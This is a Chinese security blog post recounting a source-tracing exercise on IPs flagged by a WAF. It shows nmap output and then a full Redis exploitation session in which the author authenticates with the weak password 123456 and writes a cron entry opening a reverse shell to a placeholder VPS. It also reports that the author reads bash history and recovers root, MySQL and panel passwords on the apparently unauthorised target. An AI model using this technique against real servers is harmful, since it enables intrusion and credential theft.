---
layout: post
title: "CST 2021年 4月14日 星期三：一次朔源事件的记录"
date: 2021-03-13
author: Bin4xin
toc: true
categories:
    - blog
    - 主动防御
    - 信息搜集
    - 笔记
permalink: /blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/
---

<h3><em>《Bin4xin：我的网安从业朔源事件记录》</em></h3>

### 零：起源

- _一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声_

    * 甲方：小伙伴们接集团要求需对 _WAF全流量平台_ 攻击ip进行朔源...

        * 废佬：这...（甲方你真可爱）

    * 领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
    落实外部可借力工具和资源，[[@Bin4xin废佬]](https://www.github.com/Bin4xin){:target="_blank"}也加入此次探索学习中。

        * 废佬：这...（领导你真可爱）
        
    * 领导2：_文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》_
      ```
      $ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
      223.214.211.46
      36.59.38.115
        
      $ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
      16570
      ```
        * 废佬：这...（领导你真可爱）
        
- 于是废佬就开始了愉快 _boring_ 的朔源之旅


### 一：上午、欢乐时光 & fofa安全工程师

> 鲁迅：
>
> 不会朔源的fofa安全工程师不是一个好的信息安全工程师

#### # 1x01：awk、split & linux

- 步入主题之前，先对这些文件进行一些简单的操作：
    ```
    $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
    $ cat ips_preview_by300_aa|wc -l                     
       300
    $ ll
      total 1400
      drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
      drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
      -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
      -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
      -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
      ··· 
    ```
这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。

- just fofa：
    
    ![](/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png)

#### # 1x02：Something Interesting

- _点击以了解 [fofa安全工程师们](https://fofa.so/){:target="_blank"} 与 [微步安全工程师们](https://x.threatbook.cn/){:target="_blank"}_

<img align="left" src="https://x.threatbook.cn/public/img/logo-in-header.882f692c.png" height="30%" width="50%"/>
<img align="right" src="https://fofa.so/_nuxt/img/logo.d9ee5c4.png" height="30%" width="50%"/>


欢乐而又短暂的上午如白驹过隙，一晃而过。

---

### 二：下午、枯燥时光 & 渗透测试工程师

#### # 2x01：nmap、nc & linux shell

终于：发现了一些有趣的：
```
PORT     STATE  SERVICE         VERSION
22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
80/tcp   open   http            nginx
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     24-Feb-2021 13:21  admin/
| -     24-Feb-2021 09:27  redis/
| -     24-Aug-2017 04:55  staragent/
| -     24-Feb-2021 08:44  www/
| -     24-Feb-2021 08:44  www/htdocs/
| -     13-Apr-2021 19:44  www/logs/
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Index of /
888/tcp  open   http            nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 404 Not Found
3306/tcp open   mysql           MySQL 5.5.62-log
6379/tcp open   redis           Redis key-value store
8080/tcp open   http            Apache Tomcat 8.5.63
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.63
8888/tcp open   http            Ajenti http control panel
```

- 事实上：这是一个宝塔面板，`8888+888`端口；
- 另一个事实是：这个被WAF报成`4月8日-4月12日攻击IP`的IP， _mysql & redis_ 均为弱口令。
    * _[点击更多以了解redis渗透](https://xz.aliyun.com/t/8018#toc-8){:target="_blank"}_
    
 ```
$ ./redis-cli -h redis_target_ip           
redis_target_ip:6379> get key
(error) NOAUTH Authentication required.
redis_target_ip:6379> 
redis_target_ip:6379> auth 123456
OK
redis_target_ip:6379> get key
(nil)
redis_target_ip:6379> set  xx   "\n* * * * * bash -i >& /dev/tcp/your_vps_target/port 0>&1\n"
OK
redis_target_ip:6379> config set dir /var/spool/cron/
OK
redis_target_ip:6379> config set dbfilename root
OK
redis_target_ip:6379> save
OK
redis_target_ip:6379> quit
```
    
#### # 2x02：bash、Information gathering & Traceability incident

于是我们通过上面步骤获得了服务器权限；_awesome ? next more awesome._

通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；

_**NO OFFENCE:-)Thanks**_

- 更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
    * 匮乏的linux知识导致的过多ssh连接：
    ```
    ps -ef|grep ssh|wc -l
    50
    ```
    * 错乱的终端与数据库命令运行：
    ```
    $ cat /home/admin/.bash_history 
    sudo grep wordpress_admin_passwd /root/env.txt
    /usr/local/mysql/bin/mysql -u root -p123456
    sudo su rooe
    sudo su root
    sudo grep mysql_root_passwd /root/env.txt
    mysql
    alias mysql=/usr/local/mysql/bin/mysql
    mysql
    find / -name mysql.sock
    sudo grep mysql_root_passwd /root/env.txt
    msyql
    sudo su root
    grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
    grant all privileges on *.* to 'root'@'%' identified by '123456';
    ```
    * 错误的linux权限分配：
    ```
    $ ps -ef|grep root
    root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
    root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
    root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
    ···
    ```

- 同样的：通过history找到面板管理密码；
    * tools.py form BT panel：
    ```
    $ cat /root/.bash_history |grep tools
        cd /www/server/panel && python tools.py panel pass-hidden
        $ cat /www/server/panel/tools.py
        
        if __name__ == "__main__":
            type = sys.argv[1]
            if type == 'root':
                set_mysql_root(sys.argv[2])
            elif type == 'panel':
                set_panel_pwd(sys.argv[2])
    ```

  
所以，panel模式下对应的是面板密码设置；

![](/assets/img/blog/2021/stupid-bt-panel-control-pic.png)
至此，我们获得了 _root、redis、mysql、BT panel_ ；而本文并炫技，我们的初衷是朔源：
    
- _mysql_：数据库仅仅是存放论坛系统管理的信息及测试信息；
- _redis_：配合 _mysql_，不必多说；
- _BT panel：www、ftp、sql_ 等配置均为简单配置，没有参考价值。

### 三：总结

- 1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；
- 2、结合 _# 2x01 及 # 2x02_ 小结通篇结束并未发现攻击迹象、痕迹；
- 3、为何被报为攻击IP不得而知。

以上。